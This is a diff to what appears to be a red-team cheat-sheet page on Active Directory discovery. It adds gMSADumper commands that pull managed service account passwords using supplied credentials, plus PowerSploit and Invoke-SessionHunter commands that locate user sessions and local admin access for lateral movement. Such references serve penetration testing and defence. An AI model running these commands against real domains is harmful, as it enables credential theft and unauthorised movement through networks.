@@ -45,6 +45,7 @@ permalink: /discov/ad
 		* [shoot-npusers](#shoot-npusers)
 		* [shoot-dacl](#shoot-dacl)
 		* [shoot-gmsa](#shoot-gmsa)
+		* [shoot-sessions](#shoot-sessions)
 * [iter](#iter)
 	* [iter-sid](#iter-sid)
 	* [iter-memberof](#iter-memberof)
@@ -69,7 +70,7 @@ permalink: /discov/ad
 **Tools**
 
 <script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
-<script>$(window).load(function() {var repos = [""]; for (rep in repos) {$.ajax({type: "GET", url: repos[rep], dataType: "json", success: function(result) {$("#repo_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.pushed_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>
+<script>$(window).load(function() {var repos = ["https://api.github.com/PowerShellMafia/PowerSploit","https://api.github.com/repos/Leo4j/Invoke-SessionHunter","https://api.github.com/repos/micahvandeusen/gMSADumper"]; for (rep in repos) {$.ajax({type: "GET", url: repos[rep], dataType: "json", success: function(result) {$("#repo_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.pushed_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>
 
 <link href="/sortable.css" rel="stylesheet" />
 <script src="/sortable.js"></script>
@@ -410,7 +411,21 @@ sources:
 - BloodHound Edges: [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) / [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl) / [GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite)
 
 #### <a name='shoot-gmsa'></a>shoot-gmsa
-* [gMSADumper](https://github.com/micahvandeusen/gMSADumper)
+```python
+# Pass the Hash, specific LDAP server
+python gMSADumper.py -u $ztarg_user_name -p $ztarg_user_pass -d $zdom_fqdn -l $zdom_dc_name
+
+# Kerberos Authentication, specific LDAP server
+python gMSADumper.py -k -d $zdom_fqdn -l $zdom_dc_name
+```
+
+#### <a name='shoot-sessions'></a>shoot-sessions
+```powershell
+Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
+Find-DomainUserLocation | ft
+Find-PSRemotingLocalAdminAccess
+Find-WMILocalAdminAccess
+```
 
 ## <a name='iter'></a>iter
 
@@ -514,7 +529,6 @@ Who is logged on a computer:
 ```powershell
 # get actively logged users on a computer
 Get-NetLoggedon -ComputerName $ztarg_computer_fqdn
-Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
 
 # get last logged users on a computer / uses remote registry / can be blocked
 Get-LastLoggedon -ComputerName $ztarg_computer -Credential $zlat_creds
